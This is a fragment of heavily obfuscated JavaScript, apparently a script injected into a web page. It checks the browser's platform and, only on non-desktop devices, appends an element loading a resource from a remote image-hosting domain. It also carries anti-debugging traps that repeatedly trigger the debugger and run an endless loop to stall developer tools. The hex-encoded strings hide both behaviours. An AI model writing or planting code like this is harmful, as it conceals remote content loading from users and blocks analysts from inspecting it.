system=_0x15128b,p=navigator[_0x397c76('\x30\x78\x31\x66')];system[_0x397c76('\x30\x78\x31\x38')]=p[_0x397c76('\x30\x78\x36\x35')](_0x397c76('\x30\x78\x33\x65'))==0x269c+-0x5f8*-0x1+-0x4*0xb25,system[_0x397c76('\x30\x78\x31\x31')]=p['\x69\x6e\x64\x65\x78\x4f\x66'](_0x397c76('\x30\x78\x39'))==0x26c0+0x5*0x2d1+0x5*-0xa91,system[_0x397c76('\x30\x78\x37\x31')]=p==_0x397c76('\x30\x78\x33\x35')||p[_0x397c76('\x30\x78\x36\x35')]('\x4c\x69\x6e\x75\x78')==0x1fff+0x9b9*-0x2+0x33*-0x3f;if(system['\x77\x69\x6e']||system[_0x397c76('\x30\x78\x31\x31')]||system['\x78\x6c\x6c']){}else document[_0x397c76('\x30\x78\x64')][_0x397c76('\x30\x78\x33\x38')](document[_0x397c76('\x30\x78\x31\x61')](_0x397c76('\x30\x78\x36\x63')))['\x73\x72\x63']='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x69\x63\x2e\x70\x69\x63\x2d\x69\x6d\x61\x67\x65\x73\x2e\x63\x6f\x6d\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x6f\x64\x2f\x32\x30\x32\x32\x30\x39\x32\x32\x2d\x31\x2f\x61\x31\x61\x64\x65\x34\x65\x33\x32\x30\x33\x64\x31\x34\x33\x32\x65\x61\x62\x30\x39\x38\x35\x33\x31\x36\x39\x65\x39\x65\x37\x31\x2e\x6a\x70\x67';;function _0x54bb9b(_0x98f93b){var _0x20bbbf=_0x397c76,_0x4472ba={};_0x4472ba[_0x20bbbf('\x30\x78\x33\x61')]=function(_0x52ba88,_0x42063b){return _0x52ba88+_0x42063b;},_0x4472ba['\x51\x5a\x57\x71\x43']='\x64\x65\x62\x75',_0x4472ba[_0x20bbbf('\x30\x78\x31\x30')]='\x67\x67\x65\x72',_0x4472ba[_0x20bbbf('\x30\x78\x31\x64')]=function(_0x24b17b,_0x39ece4){return _0x24b17b===_0x39ece4;},_0x4472ba[_0x20bbbf('\x30\x78\x36\x62')]=_0x20bbbf('\x30\x78\x36\x34'),_0x4472ba['\x44\x58\x5a\x65\x52']=_0x20bbbf('\x30\x78\x31'),_0x4472ba['\x65\x53\x6d\x4e\x42']=function(_0x390d6f,_0xeee2a0){return _0x390d6f!==_0xeee2a0;},_0x4472ba[_0x20bbbf('\x30\x78\x33\x31')]=function(_0x20254f,_0x2d14d6){return _0x20254f/_0x2d14d6;},_0x4472ba['\x45\x4e\x6d\x4d\x6a']=function(_0x165f9d,_0x21c225){return _0x165f9d===_0x21c225;},_0x4472ba['\x54\x61\x6c\x71\x47']=function(_0x1093b1,_0x123b6f){return _0x1093b1%_0x123b6f;},_0x4472ba[_0x20bbbf('\x30\x78\x35\x37')]=function(_0x599efa,_0x5d20b8){return _0x599efa===_0x5d20b8;},_0x4472ba[_0x20bbbf('\x30\x78\x31\x33')]=_0x20bbbf('\x30\x78\x32\x63'),_0x4472ba[_0x20bbbf('\x30\x78\x38')]='\x61\x63\x74\x69\x6f\x6e',_0x4472ba[_0x20bbbf('\x30\x78\x34\x63')]=function(_0x480063,_0x5ef656){return _0x480063!==_0x5ef656;},_0x4472ba[_0x20bbbf('\x30\x78\x34\x30')]=_0x20bbbf('\x30\x78\x31\x63'),_0x4472ba[_0x20bbbf('\x30\x78\x36\x31')]=_0x20bbbf('\x30\x78\x32\x38'),_0x4472ba[_0x20bbbf('\x30\x78\x61')]=function(_0x1476cd,_0x1c8900){return _0x1476cd(_0x1c8900);},_0x4472ba[_0x20bbbf('\x30\x78\x31\x34')]=function(_0x241e88){return _0x241e88();},_0x4472ba[_0x20bbbf('\x30\x78\x32\x62')]=_0x20bbbf('\x30\x78\x30'),_0x4472ba['\x41\x75\x42\x79\x41']=_0x20bbbf('\x30\x78\x33\x62'),_0x4472ba[_0x20bbbf('\x30\x78\x32\x31')]=_0x20bbbf('\x30\x78\x35\x66');var _0x32dbff=_0x4472ba;function _0x3329ce(_0x3c4ca9){var _0x626bee=_0x20bbbf;if(_0x32dbff[_0x626bee('\x30\x78\x31\x64')](typeof _0x3c4ca9,_0x32dbff['\x4e\x42\x6d\x6e\x64']))return function(_0x4b5c3b){}['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](_0x626bee('\x30\x78\x31\x32'))[_0x626bee('\x30\x78\x33\x37')](_0x626bee('\x30\x78\x36\x36'));else{if(_0x32dbff[_0x626bee('\x30\x78\x31\x64')](_0x32dbff['\x44\x58\x5a\x65\x52'],_0x32dbff[_0x626bee('\x30\x78\x31\x35')])){if(_0x32dbff[_0x626bee('\x30\x78\x36\x38')](_0x32dbff['\x62\x4a\x76\x43\x4d']('',_0x32dbff[_0x626bee('\x30\x78\x33\x31')](_0x3c4ca9,_0x3c4ca9))[_0x626bee('\x30\x78\x34\x62')],0x1*-0xa9f+0x20*0x6e+-0x320)||_0x32dbff[_0x626bee('\x30\x78\x34\x65')](_0x32dbff[_0x626bee('\x30\x78\x34\x32')](_0x3c4ca9,0x1bda+-0x26d7*0x1+0xb11),0x681+0xb11+-0x2*0x8c9)){if(_0x32dbff[_0x626bee('\x30\x78\x35\x37')](_0x32dbff['\x7a\x6c\x70\x46\x4f'],_0x32dbff[_0x626bee('\x30\x78\x31\x33')]))(function(){return!![];}[_0x626bee('\x30\x78\x35\x34')](_0x626bee('\x30\x78\x35\x65')+_0x32dbff['\x67\x69\x65\x76\x78'])['\x63\x61\x6c\x6c'](_0x32dbff[_0x626bee('\x30\x78\x38')]));else{function _0x577743(){var _0x372dcd=_0x2ef1e8?function(){var _0x317aab=_0x51f6;if(_0x5c7ee4){var _0x2af9f7=_0x4ceb65[_0x317aab('\x30\x78\x33\x37')](_0x49ecdc,arguments);return _0x262079=null,_0x2af9f7;}}:function(){};return _0x102186=![],_0x372dcd;}}}else{if(_0x32dbff[_0x626bee('\x30\x78\x34\x63')](_0x32dbff[_0x626bee('\x30\x78\x34\x30')],_0x32dbff[_0x626bee('\x30\x78\x34\x30')])){function _0x85b9bf(){var _0x2849b0=_0x626bee;(function(){return!![];}[_0x2849b0('\x30\x78\x35\x34')](_0x32dbff[_0x2849b0('\x30\x78\x33\x61')](_0x32dbff[_0x2849b0('\x30\x78\x36\x32')],_0x32dbff['\x67\x69\x65\x76\x78']))[_0x2849b0('\x30\x78\x32\x65')](_0x2849b0('\x30\x78\x35\x31')));}}else(function(){return![];}[_0x626bee('\x30\x78\x35\x34')](_0x32dbff[_0x626bee('\x30\x78\x33\x61')](_0x32dbff[_0x626bee('\x30\x78\x36\x32')],_0x32dbff[_0x626bee('\x30\x78\x31\x30')]))['\x61\x70\x70\x6c\x79'](_0x32dbff[_0x626bee('\x30\x78\x36\x31')]));}}else{function _0x4d891a(){var _0x5cc8a7=_0x626bee;if(_0x21d195){var _0x4a8bff=_0x1f6f08[_0x5cc8a7('\x30\x78\x33\x37')](_0x4a4a67,arguments);return _0x5cd28b=null,_0x4a8bff;}}}}_0x32dbff[_0x626bee('\x30\x78\x61')](_0x3329ce,++_0x3c4ca9);}try{if(_0x32dbff[_0x20bbbf('\x30\x78\x32\x62')]===_0x32dbff[_0x20bbbf('\x30\x78\x33\x64')]){function _0x226752(){var _0x3c644d=_0x20bbbf;_0x32dbff[_0x3c644d('\x30\x78\x31\x34')](_0x16f157);}}else{if(_0x98f93b)return _0x3329ce;else{if(_0x32dbff['\x6f\x63\x79\x5a\x4c'](_0x32dbff[_0x20bbbf('\x30\x78\x32\x31')],_0x32dbff[_0x20bbbf('\x30\x78\x32\x31')])){function _0x402908(){var _0x66000a=_0x20bbbf;return function(_0x440367){}['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x77\x68\x69\x6c\x65\x20\x28\x74\x72\x75\x65\x29\x20\x7b\x7d')[_0x66000a('\x30\x78\x33\x37')](_0x66000a('\x30\x78\x36\x36'));}}else _0x32dbff[_0x20bbbf('\x30\x78\x61')](_0x3329ce,0x1552*-0x1+0x269a+0x278*-0x7);}}}catch(_0xe8f650){}}